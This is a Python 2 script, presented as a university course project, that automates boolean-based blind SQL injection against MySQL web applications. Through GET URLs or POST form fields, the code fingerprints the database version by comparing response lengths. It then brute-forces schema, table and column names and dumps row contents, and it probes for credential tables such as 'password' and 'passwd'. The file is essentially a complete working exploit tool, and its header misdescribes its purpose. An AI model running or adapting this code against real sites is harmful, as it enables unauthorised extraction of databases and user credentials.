#!/usr/bin/env python
#=========================================================================
# IMPORTANT	: File for academic project for Final Project
#		      for course CSE545
# Category	: Academic project
# Source Name	:  ExtractDataUsingBlindSqlInjection.py
# Type		: Python File
# Description	: This program will create a Web Server to execute 
#		  Unix command on Server Machine 
# Author	: Varun Gaur & Shreyas talele
#
#         ***************Version***************
#
# Version	Author				        Date		      Reason
#   0.1 	Varun Gaur & Shreyas talele	29-April-2016	Original
#=========================================================================
import sys
import urllib2, urllib
import time

def GetLength(path,data):
	data=urllib.urlencode(data)
	req=urllib2.Request(path, data)
	req.add_header("Content-type", "application/x-www-form-urlencoded")
	page=urllib2.urlopen(req).read()
	return page;
    

def GetLengthForUrlVuln(path,data):
	data=urllib.urlencode(data)
	req=urllib2.Request(path, data)
	req.add_header("Content-type", "application/x-www-form-urlencoded")
	page=urllib2.urlopen(req).read()
	return page;
    
try:
	exploitMode = int(input("Enter exploit mode [1. for GET (Query String Based)  2. for POST (Form based) - (Default: 1): "))
except :
	exploitMode = 1
	print "Oops!  That was no valid number.  GET Mode Selected !!\n"

if (exploitMode == 1):
    try:
	getBaseVulnUrl = raw_input("Enter vulnerable URL (Ensure ID are provided): ")
    except :
	print "Vulnerable URL not provided. Exiting the process !!\n"
        #exit(2)
else:
    try:
	postVulnUrl = raw_input("Enter Vulnerable URL:  ")
        #postPayLoad = int(input("Enter key data: \n"))
    except :
	print "Oops! Expected Vulnerable URL and Payload Data not provided. Exiting the process !!\n"
        exit(2)

if (exploitMode == 1):
    data = ""
    
    getVulnUrl = getBaseVulnUrl + " AND 1=1 limit 0,1"
    page = GetLengthForUrlVuln (getVulnUrl,data)
    trueLength = str(len(GetLengthForUrlVuln (getVulnUrl,data)))
    
    getVulnUrl = getBaseVulnUrl + " AND 1=2 limit 0,1"
    falseLength = str(len(GetLengthForUrlVuln (getVulnUrl,data)))
    
    if (trueLength == falseLength):
        print "Failure and Success scenario resulting similar Web behavior. Hence extraction terminated !!!"
        exit(2)
    
    version=" and substring(@@version,{0},{1})={2} limit 0,1 -- "
    getVulnUrl = getBaseVulnUrl + version
    foundVersion = False;
    versionString = "";
    for i in range(2,9):
            getVulnUrl = getBaseVulnUrl + version.format(str(1),str(1),str(i))
            page = GetLengthForUrlVuln (getVulnUrl,data)
            if str(len(page)) == trueLength:
                    foundVersion = True
                    versionString =str(i)
                    break
                    
    if foundVersion == False :
            getVulnUrl = getBaseVulnUrl + version.format(str(1),str(2),str(10))
            page = GetLengthForUrlVuln (getVulnUrl,data)
            if str(len(page)) == trueLength:
                    foundVersion = True
                    versionString = str(10)
            else :
                    getVulnUrl = getBaseVulnUrl + version.format(str(1),str(2),str(11))
                    page = GetLengthForUrlVuln (getVulnUrl,data)
                    if str(len(page)) == trueLength:
                            foundVersion = True
                            versionString = str(11)
                    else:
                            print "Not Found"
                            exit(2)
    print "\n****  DB Version: " + versionString +  ".x.x ******"

    print ""
    print "-------------------------DATA EXTRACTION INITIATED-------------------------"
    print ""
    try:
        print "(Provide Schema (Database) details from which data need to be extracted.)"
	schmOpt = int(input("[1] User Input Schema Name\n[2] Current Schema\n[3] DB-Catalog Schema\nSelect an option: "))
    except :
        schmOpt = 3
	print "Improper schema details provided. Proceeding with option [3]\n"
    
    if (schmOpt == 1):
        try:
            schmName = raw_input("Enter Schema Name: ")
        except:
            schmOpt = 3
            print "Improper schema details provided. Proceeding with option [3]\n"
    
    
    if (schmOpt == 3):
        schmName = "information_schema"
    
    if (schmOpt == 2):
        searchSchemaName =" AND ascii(substring((select database() from dual limit 0,1),{0},1)) = {1} limit 0,1 -- "
        #searchTableName =" AND ascii(substring((select concat(table_name) from information_schema.tables limit {0},1),{1},1)) = {2} limit 0,1 #"
        foundFlag = False
        brutSchemaName = ''
        for i in range(1,64):
            for k in range(48,128):
                foundFlag = False
                fstStr = searchSchemaName.format(i,k)
                getVulnUrl = getBaseVulnUrl + fstStr
                page = GetLengthForUrlVuln(getVulnUrl,data)
                if str(len(page)) == trueLength:
                        brutSchemaName = brutSchemaName + chr(k)
                        foundFlag = True
                        break
            if (foundFlag == False):
                break
        schmName = brutSchemaName
        
    print "\n*** Schema (Database) selected for extraction: ["+schmName+ "]"
    
    print "\nTrying to extract common tables from MySql"
    ## Code for checking the common Tables of MySQL 
    #commTables = ['users', 'files','usr', 'user_name', 'password', 'pass', 'passwd', 'pwd']
    commTables = ['']
    opTable =  []
    for cTable in commTables:
        fstStr = " and (select 1 from "+schmName+"." + cTable + " limit 0,1) = 1 limit 0,1 -- "
        getVulnUrl = getBaseVulnUrl + fstStr
        page = GetLengthForUrlVuln(getVulnUrl,data)
        if str(len(page)) == trueLength:
            opTable.append(cTable)
    
    print "Common tables extracted: "+ str(opTable)
    
#    ## Code for checking the common Tables ends 
#    ## Code for checking the User Provided Tables of MySQL 
#    ## IMP*** reqTableName has to be some argument !!!!!

    ## Code for checking the User Provided Tables of MySQL Ends !!!!!
    tableNo = 10
    try:
            tableNo = int(input("Enter no of Tables you want to extract - (Default: 10): "))
    except :
            tableNo = 10
            print "Oops!  That was no valid number.  Extracting 10 Tables\n"

    print "Thanks. Wait Now..!"
    
    print "\nTable Names: ",
    searchTableName =" AND ascii(substring((select concat(table_name) from information_schema.tables where table_schema = '"+ schmName + "' limit {0},1),{1},1)) {2} {3} limit 0,1 # "
    foundFlag = False
    for p in range(0,tableNo):
#        begin = time.time()
        foundFlag = False
        atleastOne = True
        brutTableName = ''
        for i in range(1,64):
            foundFlag = False
            low = 48
            high = 128
            mid = (high + low) / 2
            fstStr = searchTableName.format(p,i,"=",mid)
            getVulnUrl = getBaseVulnUrl + fstStr
            page = GetLengthForUrlVuln(getVulnUrl,data)
            if str(len(page)) == trueLength:
                brutTableName = brutTableName + chr(mid)
                foundFlag = True
                print chr(mid),
                continue
            else:
                fstStr = searchTableName.format(p,i,"<",mid)
                getVulnUrl = getBaseVulnUrl + fstStr
                page = GetLengthForUrlVuln(getVulnUrl,data)
                if str(len(page)) == trueLength:
                        low = low
                        high = mid
                else:
                        low = mid
                        high = high
            for k in range(low,high):
                mid = (high +  low)/2
                fstStr = searchTableName.format(p,i,"=",mid)
                getVulnUrl = getBaseVulnUrl + fstStr
                page = GetLengthForUrlVuln(getVulnUrl,data)
                if str(len(page)) == trueLength:
                        brutTableName = brutTableName + chr(mid)
                        foundFlag = True
                        print chr(mid),
                        break
                else:
                        fstStr = searchTableName.format(p,i,"<",mid)
                        getVulnUrl = getBaseVulnUrl + fstStr
                        page = GetLengthForUrlVuln(getVulnUrl,data)
                        if str(len(page)) == trueLength:
                                low = low
                                high = mid
                        else:
                                low = mid
                                high = high
                if(high <= low):
                    atleastOne = False
                    break
                    
            if (atleastOne == False):
                opTable.append(brutTableName)
                print ",",
                break

    columnNo = 4096
    try:
            columnNo = int(input("\n\nEnter no of Columns you want to extract - (Default: 4096): "))
    except :
            columnNo = 4096
            print "Oops!  That was no valid number.  Extracting 4096 columns\n"

    print "Thanks. Wait Now..!"

    #searchColumnName =" AND ascii(substring((select concat(table_name) from information_schema.tables where table_schema = '"+ schmName + "' limit {0},1),{1},1)) = {2} limit 0,1 # "
    searchColumnName =" AND ascii(substring((select concat(column_name) from information_schema.columns where table_name='{0}' and  table_schema = '"+schmName+"' limit {3},1),{1},1)) {4} {2} limit 0,1 # "
    tableColumnDict = {}
    for j in opTable:
            columnNames = []	
            anotherCol = True
            print "\nColumnNames for Table ["+j+"]: ",
            for l in range(0,columnNo):
                    if(anotherCol):
                            foundFlag = True
                            anotherCol = False
                            columnName = ""
                            atleastOne = True
                            for i in range(1,64):
                                    if(foundFlag):
                                            low = 48
                                            high = 128
                                            mid = (high + low) / 2
                                            foundFlag = False
                                            fstStr = searchColumnName.format(j,i,mid,l,"=")
                                            getVulnUrl = getBaseVulnUrl + fstStr
                                            page = GetLengthForUrlVuln(getVulnUrl,data)
                                            if str(len(page)) == trueLength:
                                                columnName = columnName + chr(mid)
                                                print chr(mid),
                                                foundFlag = True
                                                anotherCol = True
                                                continue
                                            else:
                                                fstStr = searchColumnName.format(j,i,mid,l,"<")
                                                getVulnUrl = getBaseVulnUrl + fstStr
                                                page = GetLengthForUrlVuln(getVulnUrl,data)
                                                if str(len(page)) == trueLength:
                                                    low = low
                                                    high = mid
                                                else:
                                                    low = mid
                                                    high = high
                                                    
                                            for k in range(low,high):
                                                    mid = (high +  low)/2
                                                    fstStr = searchColumnName.format(j,i,mid,l,"=")
                                                    getVulnUrl = getBaseVulnUrl + fstStr
                                                    page = GetLengthForUrlVuln(getVulnUrl,data)
                                                    if str(len(page)) == trueLength:
                                                            columnName = columnName + chr(mid)
                                                            print chr(mid),
                                                            foundFlag = True
                                                            anotherCol = True
                                                            break
                                                    else:
                                                            fstStr = searchColumnName.format(j,i,mid,l,"<")
                                                            getVulnUrl = getBaseVulnUrl + fstStr
                                                            page = GetLengthForUrlVuln(getVulnUrl,data)
                                                            if str(len(page)) == trueLength:
                                                                low = low
                                                                high = mid
                                                            else:
                                                                low = mid
                                                                high = high
                                                    if(high <= low):
                                                        atleastOne = False
                                                        break
                                            if (atleastOne == False):
                                                    columnNames.append(columnName)
                                                    print ",",
                                                    break
                                    else :
                                            if columnName != "":
                                                    columnNames.append(columnName)
                                            print ",",
                                            break
                            tableColumnDict[j] = columnNames
                    else:
                            print ",",
                            break;
    
    searchDataName =" AND ascii(substring((select concat({0}) from " +schmName+ ".{1} limit {2},1),{3},1)) = {4} limit 0,1 # "
    for keyInDict in tableColumnDict:
            columnNames = []
            columnNames = tableColumnDict[keyInDict]
            for column in columnNames:
                    anotherRow = True
                    for row in range(0,1000):
                            if(anotherRow):
                                    columnVal = ""
                                    found = True
                                    anotherRow = False
                                    for val in range(1, 65535):
                                            if (found):			
                                                    found = False
                                                    for k in range(48,128):
                                                            fstStr = searchDataName.format(column,keyInDict,row,val,k)
                                                            getVulnUrl = getBaseVulnUrl + fstStr
                                                            page = GetLengthForUrlVuln(getVulnUrl,data)
                                                            if str(len(page)) == trueLength:
                                                                    columnVal = columnVal + chr(k)
                                                                    found = True
                                                                    anotherRow = True
                                                                    break
                                            else:
                                                    if(columnVal != ""):					
                                                            print "\tTable :"+keyInDict+", Column: "+ column +", Data: " + columnVal
                                                    break
                            else:
                                    break;
else:
    try:
        noOfFormVar = int(input("Enter number of form variables present: "))
    except:
        noOfFormVar = 2
        print "Improper schema details provided. Proceeding with [2]\n"

    inputListData = []
    for u in range(0,noOfFormVar):
        try:
            var1 = raw_input("Enter form Variable Name ["+str(u+1)+"]: ")
            val1 = raw_input("Enter form Variable Value ["+str(u+1)+"]: ")
            inputListData.append((var1,val1))
        except:
            print "Improper schema details provided. Exiting program!!\n"
            exit(2)
    
    print "Entered form variables are : ",
    for u in range(0,noOfFormVar):
        print "["+str(u+1)+"]" +inputListData[u][0],
        print ",",
    
    try:
        vulnFormVar = int(input("\nPlease provide the vulnerable form Variable Name: "))
    except:
        print "Improper schema details provided. Exiting program!!\n"
        exit(2)
    
    newVal = " ' OR 1=1 limit 0,1 -- "
    inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
    trueLength = str(len(GetLength (postVulnUrl,inputListData)))

    #falseData=[('name'," ' OR 1=2 limit 0,1 -- "),('submitaccess','true') ] 
    newVal = " ' OR 1=2 limit 0,1 -- "
    inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
    falseLength = str(len(GetLength (postVulnUrl,inputListData)))

    if (trueLength == falseLength):
        print "Failure and Success scenario resulting similar Web behavior. Hence extraction terminated !!!"
        exit(2)
        
    version=" ' OR substring(@@version,{0},{1})={2} limit 0,1 -- "
    foundVersion = False;
    versionString = "";
    for i in range(2,9):
            #myData=[('name',version.format(str(1),str(1),str(i))) ,('submitaccess','true')]
            newVal = version.format(str(1),str(1),str(i))
            inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
            page = GetLength(postVulnUrl,inputListData)
            if str(len(page)) == trueLength:
                    foundVersion = True
                    versionString =str(i)
                    break;
    if foundVersion == False :
            newVal = version.format(str(1),str(2),str(10))
            inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
            page = GetLength(postVulnUrl,inputListData)
            if str(len(page)) == trueLength:
                    foundVersion = True
                    versionString = str(10)
            else :
                    newVal = version.format(str(1),str(2),str(11))
                    inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
                    page = GetLength(postVulnUrl,inputListData)
                    if str(len(page)) == trueLength:
                            foundVersion = True
                            versionString = str(11)
                    else:
                            print "Not Found"
                            exit(2)
    print "\n****  DB Version: " + versionString +  ".x.x ******"

    print ""
    print "-------------------------DATA EXTRACTION INITIATED-------------------------"
    print ""
    try:
        print "(Provide Schema (Database) details from which data need to be extracted.)"
	schmOpt = int(input("[1] User Input Schema Name\n[2] Current Schema\n[3] DB-Catalog Schema\nSelect an option: "))
    except :
        schmOpt = 3
	print "Improper schema details provided. Proceeding with option [3]\n"
    
    if (schmOpt == 1):
        try:
            schmName = raw_input("Enter Schema Name: ")
        except:
            schmOpt = 3
            print "Improper schema details provided. Proceeding with option [3]\n"
    
    
    if (schmOpt == 3):
        schmName = "information_schema"
    
    if (schmOpt == 2):
        searchSchemaName =" ' OR ascii(substring((select database() from dual limit 0,1),{0},1)) = {1} limit 0,1 -- "
        foundFlag = False
        brutSchemaName = ''
        for i in range(1,64):
            for k in range(48,128):
                foundFlag = False
                newVal = searchSchemaName.format(i,k)
                inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
                page = GetLength(postVulnUrl,inputListData)
                if str(len(page)) == trueLength:
                        brutSchemaName = brutSchemaName + chr(k)
                        foundFlag = True
                        break
            if (foundFlag == False):
                break
        schmName = brutSchemaName
        
    print "\n*** Schema (Database) selected for extraction: ["+schmName+ "]"


    ## Code for checking the common Tables of MySQL 
    print "Trying to extract data from some common MySql tables !!! \n"
    commTables = ['username', 'user', 'file','usr', 'user_name', 'password', 'pass', 'passwd', 'pwd']

    opTable =  []
    for cTable in commTables:
            newVal = " ' or (select 1 from "+schmName+ "." + cTable + " limit 0,1) = 1 # "
            inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
            page = GetLength(postVulnUrl,inputListData)
            if trueLength == str(len(page)):
              opTable.append(cTable)

    ## Code for checking the common Tables ends 
    ## Code for checking the User Provided Tables of MySQL 
    ## IMP*** reqTableName has to be some argument !!!!!
    print "Common tables extracted: "+ str(opTable)
    ## Code for checking the User Provided Tables of MySQL Ends !!!!!
    tableNo = 10
    try:
            tableNo = int(input("Enter no of Tables you want to extract - (Default: 10)\n"))
    except :
            tableNo = 10
            print "Oops!  That was no valid number.  Extracting 10 Tables\n"

    print "Thanks. Wait Now..!"

    searchTableName =" ' or ascii(substring((select concat(table_name) from information_schema.tables where table_schema = '"+schmName+"' limit {0},1),{1},1)) = {2} limit 0,1 # "
    foundFlag = False
    brutTableName = ''
    print "Tables extracted: ",
    for p in range(0,tableNo):
        for i in range(1,64):
            for k in range(48,128):
                    foundFlag = False
                    newVal = searchTableName.format(p,i,k)
                    inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
                    page = GetLength(postVulnUrl,inputListData)
                    if str(len(page)) == trueLength:
                            brutTableName = brutTableName + chr(k)
                            print chr(k),
                            foundFlag = True
                            break
            if (foundFlag == False):
                break
        print ",",
        opTable.append(brutTableName)
        brutTableName = ''

#    print "Tables extracted: "+ str(opTable)

    columnNo = 4096
    try:
            columnNo = int(input("\n\nEnter no of Columns you want to extract - (Default: 4096): "))
    except :
            columnNo = 4096
            print "Oops!  That was no valid number.  Extracting 4096 columns\n"

    print "Thanks. Wait Now..!"

    searchColumnName =" ' or ascii(substring((select concat(column_name) from information_schema.columns where table_name='{0}' and  table_schema = '"+schmName+"' limit {3},1),{1},1)) = {2} limit 0,1 # "

    tableColumnDict = {}
    for j in opTable:
            columnNames = []	
            anotherCol = True
            print "\nColumnNames for Table ["+j+"]: ",
            for l in range(0,columnNo):
                    if(anotherCol):
                            foundFlag = True
                            anotherCol = False
                            columnName = ""
                            for i in range(1,64):
                                    if(foundFlag):
                                            foundFlag = False
                                            for k in range(48,128):
                                                    newVal = searchColumnName.format(j,i,k,l)
                                                    inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
                                                    page = GetLength(postVulnUrl,inputListData)
                                                    if str(len(page)) == trueLength:
                                                            columnName = columnName + chr(k)
                                                            print chr(k),
                                                            foundFlag = True
                                                            anotherCol = True
                                                            break
                                    else :
                                            if columnName != "":
                                                    columnNames.append(columnName)
                                            print ",",
                                            break
                            tableColumnDict[j] = columnNames
                    else:
                            break;

    #print "ColumnNames: \n" + str(tableColumnDict)

    searchDataName =" ' or ascii(substring((select concat({0}) from "+schmName+".{1} limit {2},1),{3},1)) = {4} #"
    for keyInDict in tableColumnDict:
            columnNames = []
            columnNames = tableColumnDict[keyInDict]
            for column in columnNames:
                    anotherRow = True
                    for row in range(0,1000):
                            if(anotherRow):
                                    columnVal = ""
                                    found = True
                                    anotherRow = False
                                    for val in range(1, 65535):
                                            if (found):			
                                                    found = False
                                                    for k in range(48,128):
                                                            newVal = searchDataName.format(column,keyInDict,row,val,k)
                                                            inputListData[vulnFormVar-1] = (inputListData[vulnFormVar-1][0],newVal)
                                                            page = GetLength(postVulnUrl,inputListData)
                                                            if str(len(page)) == trueLength:
                                                                    columnVal = columnVal + chr(k)
#                                                                    print chr(k),
                                                                    found = True
                                                                    anotherRow = True
                                                                    break
                                            else:
                                                    if(columnVal != ""):					
                                                            print "\n\tTable :"+keyInDict+", Column: "+ column +", Data: " + columnVal
#                                                    print ",",
                                                    break
                            else:
                                    break;
